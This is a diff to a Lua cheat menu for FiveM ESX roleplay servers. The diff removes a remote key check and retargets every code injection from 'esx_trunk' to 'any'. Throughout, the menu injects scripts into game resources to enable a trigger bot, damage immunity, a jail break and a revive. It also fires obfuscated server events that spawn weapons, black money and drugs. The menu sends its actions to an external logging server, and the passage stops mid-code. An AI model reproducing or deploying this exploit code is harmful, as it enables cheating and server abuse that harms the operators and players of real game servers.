@@ -8,8 +8,8 @@ local isMenuVisible = false
 local isAuthenticated = false
 local isChecking = false
 
--- رابط المفاتيح
-local KeysURL = "https://raw.githubusercontent.com/wwhostd/29/refs/heads/main/Keys.txt"
+-- التحقق يتم من S29-Auth.lua
+-- هذا الملف يقرأ من _G.S29_AUTHORIZED
 
 -- رابط السيرفر للوق
 local ActionLogURL = "https://s29-production.up.railway.app/action"
@@ -187,44 +187,7 @@ function SendActionLog(tab, action, details, amount, item, vehicle, plate, targe
     end)
 end
 
--- دالة التحقق من المفتاح
-function CheckAuthentication()
-    if isChecking then
-        return false
-    end
-    
-    isChecking = true
-    print("===========================================")
-    print("                           Checking authentication...")
-    
-    local CurrentKey = MachoAuthenticationKey()
-    print("                           Your Key: " .. CurrentKey)
-    
-    local KeysBin = MachoWebRequest(KeysURL)
-    
-    if not KeysBin or KeysBin == "" then
-        print("                           ERROR: Failed to fetch keys from server!")
-        isChecking = false
-        return false
-    end
-    
-    local KeyPresent = string.find(KeysBin, CurrentKey)
-    
-    if KeyPresent ~= nil then
-        print("                           SUCCESS: Key is authenticated!")
-        print("                           Key: [" .. CurrentKey .. "]")
-        isAuthenticated = true
-        isChecking = false
-        return true
-    else
-        print("                           FAILED: Key is not in the list!")
-        print("                           Key: [" .. CurrentKey .. "]")
-        print("                           Contact to albs6wisi to get access.")
-        isAuthenticated = false
-        isChecking = false
-        return false
-    end
-end
+-- التحقق يتم من S29-Auth.lua عبر _G.S29_AUTHORIZED
 
 -- دالة فحص المفتاح المخصص
 function IsCustomKeybindPressed()
@@ -457,7 +420,7 @@ for _, tabName in ipairs(Tabs) do
         MachoMenuCheckbox(leftGroup, "Infinite Run", 
             function()
                 SendActionLog("Main", "Infinite Run", "Enabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 infiniteRunEnabled = true
 if infiniteRunThread then infiniteRunThread = nil end
 infiniteRunThread = Citizen.CreateThread(function()
@@ -477,7 +440,7 @@ end)
             end,
             function()
                 SendActionLog("Main", "Infinite Run", "Disabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 infiniteRunEnabled = false
 if infiniteRunThread then infiniteRunThread = nil end
 ]])
@@ -488,7 +451,7 @@ if infiniteRunThread then infiniteRunThread = nil end
         MachoMenuCheckbox(leftGroup, "Enhanced Trigger Bot", 
             function()
                 SendActionLog("Main", "Enhanced Trigger Bot", "Enabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 isTriggerBotEnabled = true
 local targetBone = 31086
 local maxDistance = 170.0
@@ -555,7 +518,7 @@ end)
             end,
             function()
                 SendActionLog("Main", "Enhanced Trigger Bot", "Disabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 isTriggerBotEnabled = false
 print("T: OFF")
 ]])
@@ -566,7 +529,7 @@ print("T: OFF")
         MachoMenuCheckbox(leftGroup, "Heavy Blood Armor", 
             function()
                 SendActionLog("Main", "Heavy Blood Armor", "Enabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 bloodArmorEnabled = true
 local bloodArmorThread = nil
 if bloodArmorThread then bloodArmorThread = nil end
@@ -598,7 +561,7 @@ print("B: ON")
             end,
             function()
                 SendActionLog("Main", "Heavy Blood Armor", "Disabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 bloodArmorEnabled = false
 SetPlayerWeaponDefenseModifier(PlayerId(), 1.0)
 SetPlayerMeleeWeaponDefenseModifier(PlayerId(), 1.0)
@@ -611,7 +574,7 @@ print("B: OFF")
         MachoMenuCheckbox(leftGroup, "Exit on H", 
             function()
                 SendActionLog("Main", "Exit on H", "Enabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 cleanExitEnabled = true
 Citizen.CreateThread(function()
     while cleanExitEnabled do
@@ -631,7 +594,7 @@ end)
             end,
             function()
                 SendActionLog("Main", "Exit on H", "Disabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[cleanExitEnabled = false]])
+                MachoInjectResource("any", [[cleanExitEnabled = false]])
                 MachoMenuNotification("Main", "Clean Exit disabled!")
             end
         )
@@ -640,7 +603,7 @@ end)
 
         MachoMenuButton(leftGroup, "Food & Drink", function()
             SendActionLog("Main", "Food & Drink", "Filled hunger and thirst", "", "", "", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerEvent('esx_status:set', 'thirst', 1000000)
 TriggerEvent('esx_status:set', 'hunger', 1000000)
 ]])
@@ -649,19 +612,19 @@ TriggerEvent('esx_status:set', 'hunger', 1000000)
 
         MachoMenuButton(leftGroup, "S6llh", function()
             SendActionLog("Main", "S6llh", "Drunk status activated", "", "", "", "", "")
-            MachoInjectResource("esx_trunk", [[TriggerEvent('esx_status:set', 'drunk', 100000)]])
+            MachoInjectResource("any", [[TriggerEvent('esx_status:set', 'drunk', 100000)]])
             MachoMenuNotification("Main", "S6llh activated!")
         end)
 
         MachoMenuButton(leftGroup, "Handcuff", function()
             SendActionLog("Main", "Handcuff", "Handcuff toggle", "", "", "", "", "")
-            MachoInjectResource("esx_trunk", [[TriggerEvent('esx_misc:handcuff')]])
+            MachoInjectResource("any", [[TriggerEvent('esx_misc:handcuff')]])
             MachoMenuNotification("Main", "Handcuff activated!")
         end)
 		
         MachoMenuButton(leftGroup, "Jail Break", function()
             SendActionLog("Main", "Jail Break", "Escaped from jail", "", "", "", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('uU2zcTXqiWMJSP51qcuY8boTeiULEUL2dgL0oeOCCQv7Jo2vtQMtR6VB28oYqfrvcdaU5z4lCdvkVwk0FGI1cdOO849AjZxk7YsCTHFDdLnSMws6K5IwIW1a:mL67lTBa7FRrvfRYG1w7v0NXuqQRZzpAjxXuc4Wg2dojR25i3QVPKppu8qyJtvTVrf0s4QNSbbAHcWLovDpDsCQ3GMb3GAL04LxN1U7mI0pZAaiwXD3oURkJ', 0, 369553850)
 ]])
             MachoMenuNotification("Main", "Jail Break activated!")
@@ -669,7 +632,7 @@ TriggerServerEvent('uU2zcTXqiWMJSP51qcuY8boTeiULEUL2dgL0oeOCCQv7Jo2vtQMtR6VB28oY
 		
         MachoMenuButton(leftGroup, "!!! Back From Hell !!!", function()
             SendActionLog("Main", "Back From Hell", "Revived from death", "", "", "", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerEvent('f3rebLys7SpF4YAUDpCIaNA1JznUl2KoPNaoZkxWhraaFjBQxDa7pobgsCphwa4ZdrElCWM1HSivY9nhqZLTV7Nb2eIwLcfJ3Ihapv7LbhX1YiISDCBTo44n:qc58XdT4Y0xID2HAJrimsrcOGVP1dGW8HG01DIZ0xq1ngeFcUIiRUm6YcLghXrKE3emSy1Jv6YY6A27mWGNrgznbh4AvRZ6CGuPenCwPtV7UhyFkekP8QAH9')
 ]])
             MachoMenuNotification("Main", "Back From Hell activated!")
@@ -684,7 +647,7 @@ TriggerEvent('f3rebLys7SpF4YAUDpCIaNA1JznUl2KoPNaoZkxWhraaFjBQxDa7pobgsCphwa4Zdr
         MachoMenuCheckbox(rightGroup, "Anti Crash Damage", 
             function()
                 SendActionLog("Main", "Anti Crash Damage", "Enabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 antiCrashDamageEnabled = true
 if antiCrashThread then antiCrashThread = nil end
 antiCrashThread = Citizen.CreateThread(function()
@@ -726,7 +689,7 @@ print("Anti Crash Damage: ON")
             end,
             function()
                 SendActionLog("Main", "Anti Crash Damage", "Disabled", "", "", "", "", "")
-                MachoInjectResource("esx_trunk", [[
+                MachoInjectResource("any", [[
 antiCrashDamageEnabled = false
 if antiCrashThread then antiCrashThread = nil end
 local ped = PlayerPedId()
@@ -747,7 +710,7 @@ print("Anti Crash Damage: OFF")
 
         MachoMenuButton(group, "Combat PDW", function()
             SendActionLog("Weapon", "Combat PDW", "Got weapon from ORF 370", "1", "WEAPON_COMBATPDW", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_COMBATPDW', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Combat PDW obtained!")
@@ -755,7 +718,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Revolver", function()
             SendActionLog("Weapon", "Revolver", "Got weapon from ORF 370", "1", "WEAPON_REVOLVER", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_REVOLVER', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Revolver obtained!")
@@ -763,7 +726,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Pump Shotgun", function()
             SendActionLog("Weapon", "Pump Shotgun", "Got weapon from ORF 370", "1", "WEAPON_PUMPSHOTGUN", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_PUMPSHOTGUN', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Pump Shotgun obtained!")
@@ -771,7 +734,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Micro SMG", function()
             SendActionLog("Weapon", "Micro SMG", "Got weapon from ORF 370", "1", "WEAPON_MICROSMG", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_MICROSMG', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Micro SMG obtained!")
@@ -779,7 +742,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 		
         MachoMenuButton(group, "Switchblade", function()
             SendActionLog("Weapon", "Switchblade", "Got weapon from ORF 370", "1", "WEAPON_SWITCHBLADE", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_SWITCHBLADE', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Switchblade obtained!")
@@ -789,7 +752,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Micro SMG DEV 2", function()
             SendActionLog("Weapon", "Micro SMG DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_MICROSMG", "BFQ 646", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_MICROSMG', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Micro SMG DEV 2 obtained!")
@@ -797,7 +760,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Combat PDW DEV 2", function()
             SendActionLog("Weapon", "Combat PDW DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_COMBATPDW", "BFQ 646", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_COMBATPDW', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Combat PDW DEV 2 obtained!")
@@ -805,7 +768,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Revolver DEV 2", function()
             SendActionLog("Weapon", "Revolver DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_REVOLVER", "BFQ 646", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_REVOLVER', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Revolver DEV 2 obtained!")
@@ -813,7 +776,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Pump Shotgun DEV 2", function()
             SendActionLog("Weapon", "Pump Shotgun DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_PUMPSHOTGUN", "BFQ 646", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_PUMPSHOTGUN', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Pump Shotgun DEV 2 obtained!")
@@ -821,7 +784,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Switchblade DEV 2", function()
             SendActionLog("Weapon", "Switchblade DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_SWITCHBLADE", "BFQ 646", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_SWITCHBLADE', 1, 717225484)
 ]])
             MachoMenuNotification("Weapon", "Switchblade DEV 2 obtained!")
@@ -831,7 +794,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Add Ammo", function()
             SendActionLog("Weapon", "Add Ammo", "Added 220 ammo to current weapon", "220", "", "", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 Citizen.CreateThread(function()
     Wait(1000)
     local player = PlayerPedId()
@@ -844,7 +807,7 @@ end)
 
         MachoMenuButton(group, "Weapon License", function()
             SendActionLog("Weapon", "Weapon License", "Got weapon license", "", "", "", "", "")
-            MachoInjectResource("esx_trunk", [[TriggerServerEvent('esx_dmvschool:addLicense', "weapon_top")]])
+            MachoInjectResource("any", [[TriggerServerEvent('esx_dmvschool:addLicense', "weapon_top")]])
             MachoMenuNotification("Weapon", "Weapon License obtained!")
         end)
 
@@ -852,7 +815,7 @@ end)
 
         MachoMenuButton(group, "Remove PDW", function()
             SendActionLog("Weapon", "Remove PDW", "Removed weapon to ORF 370", "1", "WEAPON_COMBATPDW", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_COMBATPDW', 1, 50000000, 'ORF 370 ', 482526481)
 ]])
             MachoMenuNotification("Weapon", "PDW removed!")
@@ -860,7 +823,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Remove Revolver", function()
             SendActionLog("Weapon", "Remove Revolver", "Removed weapon to ORF 370", "1", "WEAPON_REVOLVER", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_REVOLVER', 1, 50000000000, 'ORF 370 ', 482526481)
 ]])
             MachoMenuNotification("Weapon", "Revolver removed!")
@@ -868,7 +831,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Remove Micro SMG", function()
             SendActionLog("Weapon", "Remove Micro SMG", "Removed weapon to ORF 370", "1", "WEAPON_MICROSMG", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_MICROSMG', 1, 50000000, 'ORF 370 ', 482526481)
 ]])
             MachoMenuNotification("Weapon", "Micro SMG removed!")
@@ -876,7 +839,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Remove Switchblade", function()
             SendActionLog("Weapon", "Remove Switchblade", "Removed weapon to ORF 370", "1", "WEAPON_SWITCHBLADE", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_SWITCHBLADE', 1, 50000000000, 'ORF 370 ', 482526481)
 ]])
             MachoMenuNotification("Weapon", "Switchblade removed!")
@@ -884,7 +847,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
 
         MachoMenuButton(group, "Remove Shotgun", function()
             SendActionLog("Weapon", "Remove Shotgun", "Removed weapon to ORF 370", "1", "WEAPON_PUMPSHOTGUN", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_PUMPSHOTGUN', 1, 50000000, 'ORF 370 ', 482526481)
 ]])
             MachoMenuNotification("Weapon", "Shotgun removed!")
@@ -900,7 +863,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Withdraw Black Money", function()
             local amount = selectedMoneyAmount * 1000
             SendActionLog("Money", "Withdraw Black Money", "Withdrew black money from ORF 370", tostring(amount), "black_money", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_account', 'black_money', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Money", "Withdrew $" .. amount .. " black money!")
@@ -909,7 +872,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Deposit Black Money", function()
             local amount = selectedMoneyAmount * 1000
             SendActionLog("Money", "Deposit Black Money", "Deposited black money to ORF 370", tostring(amount), "black_money", "ORF 370", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_account', 'black_money', ]] .. amount .. [[, 5000000000, 'ORF 370 ', 482526481)
 ]])
             MachoMenuNotification("Money", "Deposited $" .. amount .. " black money!")
@@ -925,7 +888,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Weed", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Weed (Fight)", "Got weed from TCU 564", tostring(amount), "weed", "TCU 564", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'weed', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Weed!")
@@ -934,7 +897,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Coke", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Coke (Fight)", "Got coke from TCU 564", tostring(amount), "coke", "TCU 564", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
 TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'coke', ]] .. amount .. [[, 717225484)
 ]])
             MachoMenuNotification("Item", "Got " .. amount .. "x Coke!")
@@ -943,7 +906,7 @@ TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6
         MachoMenuButton(group, "Bigbox", function()
             local amount = selectedDrugAmount
             SendActionLog("Item", "Bigbox", "Got bigbox from TCU 564", tostring(amount), "bigbox", "TCU 564", "", "")
-            MachoInjectResource("esx_trunk", [[
+            MachoInjectResource("any", [[
